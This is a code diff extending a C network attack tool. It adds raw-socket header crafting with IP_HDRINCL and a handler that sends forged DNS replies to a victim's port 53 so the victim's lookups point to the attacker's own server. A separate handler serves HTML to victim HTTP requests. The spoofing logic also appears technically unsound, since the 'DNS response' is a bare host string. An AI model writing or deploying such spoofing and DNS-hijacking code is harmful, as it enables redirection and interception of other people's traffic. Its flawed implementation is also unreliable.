@@ -50,9 +50,18 @@ void error(const char *msg) {
 }
 
 void send_fake_response(const char *response, const char *victim_ip, int victim_port) {
+    // Tell kernel we're including our own headers
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock < 0) {
         perror("socket creation failed");
+        return;
+    }
+
+    // Set IP_HDRINCL to craft our own IP header
+    int one = 1;
+    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
+        perror("setsockopt IP_HDRINCL");
+        close(sock);
         return;
     }
 
@@ -104,12 +113,17 @@ void send_fake_response(const char *response, const char *victim_ip, int victim_
 void handle_victim_request(const char *buffer, struct sockaddr_in *clientaddr, socklen_t len, int sockfd) {
     printf("\n[+] Processing request: %s\n", buffer);
     
-    if (strstr(buffer, "VICTIM_PING") != NULL) {
-        // Send fake ping response
-        const char *response = "ICMP Echo Reply (Spoofed)";
+    if (strstr(buffer, "DNS_INTERCEPT") != NULL) {
+        // Send fake DNS response pointing to our server
+        struct sockaddr_in victim;
+        victim.sin_family = AF_INET;
+        victim.sin_addr.s_addr = inet_addr(VICTIM_IP);
+        victim.sin_port = htons(53);
+        
+        const char *response = LOCAL_SERVER_HOST;  // Our IP as the DNS response
         sendto(sockfd, response, strlen(response), 0, 
-               (struct sockaddr *)clientaddr, len);
-        printf("[+] Sent fake PING response\n");
+               (struct sockaddr *)&victim, sizeof(victim));
+        printf("[+] Sent fake DNS response\n");
     }
     else if (strstr(buffer, "VICTIM_HTTP") != NULL) {
         char *html_content = read_html_file();
